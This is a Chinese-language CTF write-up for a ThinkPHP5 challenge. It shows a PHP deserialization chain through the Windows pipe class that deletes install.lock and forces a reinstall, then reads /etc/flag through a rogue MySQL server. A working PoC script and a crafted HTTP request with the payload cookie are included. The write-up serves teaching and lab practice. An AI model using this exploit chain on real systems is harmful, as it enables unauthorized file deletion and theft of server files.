# NoteBook
## 考点

- thinkphp5 反序列化任意文件删除
- phpmyadmin任意文件读取[phpMyAdmin 4.8.4 - 'AllowArbitraryServer' Arbitrary File Read](https://www.exploit-db.com/exploits/46041)

## 流程
1. 审计源码得到任意文件删除漏洞
2. 利用任意文件删除漏洞，删除install.lock，达到任意重装目的
3. 利用Mysql的`LOAD DATA INFILE`，建立一个假的mysql server读取/etc/flag

## 题目说明
听说最近thinkphp很火？

读取`/etc/flag`

## writeup

#### thinkphp反序列化漏洞利用
1. 扫描路径，得到www.zip 文件，泄漏了源码。
2. 审计后得到关注点
application/common.php
```php
function getSessionUser()
{
    $info = decode(\think\Cookie::get('info'));
    if(is_array($info) && isset($info['username']) && isset($info['password'])){
        $user = \think\Db::name('users')
            ->where('username','=',$info['username'])
            ->where('password','=',$info['password'])
            ->find();
        \think\Session::set('privilege',$user['id']);
        \think\Session::set('username',$user['username']);
        \think\Cookie::set('info',encode($user));
        return $user['id'];
    }
    unset($info);
    return null;
}
```
主要逻辑为从cookie中获取到用户相关信息，并查询该用户的权限信息。那么继续看decode函数是如何处理cookie中得到的数据的
```php
function decode($info)
{
    $key = CS;
    $info = urldecode($info);
    $kl = strlen($key);
    $il = strlen($info);
    for($i = 0; $i < $il; $i++)
    {
        $p = $i%$kl;
        $info[$i] = chr(ord($info[$i])-ord($key[$p]));
    }
    $info = unserialize($info);
    return $info;
}
```

可以发现做了简单的数学运算，并调用了unserialize函数，那么如果$key可控的化，我们就能触发一个反序列化漏洞。来看一下$key是怎么生成的

```php
define('CS',md5(base64_encode($_SERVER['HTTP_HOST'])));
```

很明显HTTP_HOST对我们来说是可控的，那么相当于我们有了反序列化的利用点，只需要再找到一个反序列化串就可以达到目的。
直接查找几个常见的魔术函数，找到一个位置可利用thinkphp/library/think/process/pipes/Windows.php
```php
<?php
namespace think\process\pipes;

use think\Process;

class Windows extends Pipes
{

    /** @var array */
    private $files = [];
    /** @var array */
    private $fileHandles = [];
    /** @var array */
    private $readBytes = [
        Process::STDOUT => 0,
        Process::STDERR => 0,
    ];
    
    // ...
    
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }

    // ...
    
    /**
     * 删除临时文件
     */
    private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
    // ...
}
```
可以注意到Windows类的__destruct函数调用了removeFiles函数，而removeFiles会删除$this->files里面的文件，所以用这个类我们可以达到任意文件删除的效果。
由于这道题本身的题目功能有限，除了主要功能，还有一个install模块，该模块完成安装过程。并且判断是否已经安装，由public/install.lock文件决定。既然我们可以达到任意文件删除的效果，我们就可以利用该漏洞造成重装漏洞。写一下poc
```php
<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 * Date: 2019/1/2
 * Time: 20:41
 */




namespace think\process\pipes {
    define('CS',md5(base64_encode('127.0.0.1')));

    class Windows {
        private $files = [
            'public/install.lock',
        ];
        public function __construct()
        {

        }
    }

    function encode($info)
    {
        $info = serialize($info);
        $key = CS;
        $kl = strlen($key);
        $il = strlen($info);
        for($i = 0; $i < $il; $i++)
        {
            $p = $i%$kl;
            $info[$i] = chr(ord($info[$i])+ord($key[$p]));
        }
        return urlencode($info);
    }

    $poc = new Windows();
    var_dump(encode($poc));
}
```
替换cookie中的info值，这里需要注意的是系统仅当用户的session不存在时，才会去读cookie中的info值，那么在发包时需要删除cookie中的session值。
```
GET /index/index/logout HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/index/note/getall.html
Connection: close
Cookie:  info=%B2pf%9BkY%A7%98%CC%D3%A1%C2%D1%D5%9F%9B%C9%D9%D8%8D%A0%9C%A3%9B%A5%91%87%CC%A1%C9%A6%A9%D6Xn%95k%B2%A6j%96%99p%88a%D7%98%A1%D2%D1%C1%A1%A2%A2%96%9B%A5%A8%8C%D3%9C%D5%9C%A5%BF%8D%9D%D2%95%A6%AA%A3c%CB%9F%D2%C6%D6Rs%C5%A0%96k%AB%9Cmfm%A8j%94l%9FY%A2%D8%98%A0%CD%94f%9C%9E%D6%D9%97%D2%CD%91%9C%A7%C7%D1%87l%AD%B0
Upgrade-Insecure-Requests: 1
```
#### 利用fake mysql server任意读取文件
到了这里，我们可以看到系统的重装页面，主要为mysql的一个系统配置，根据phpMyAdmin 4.8.4的任意文件读取漏洞原理，不难看出利用该原理，我们也同样可以读取/etc/flag文件内容
这里利用[GitHub - allyshka/Rogue-MySql-Server: MySQL fake server for read files of connected clients](https://github.com/allyshka/Rogue-MySql-Server) 建立起一个假的mysql端，并在系统配置页面配置上ip等相关信息
这里不好贴图，就不贴图了，配置好后，在mysql.log里就能看到flag


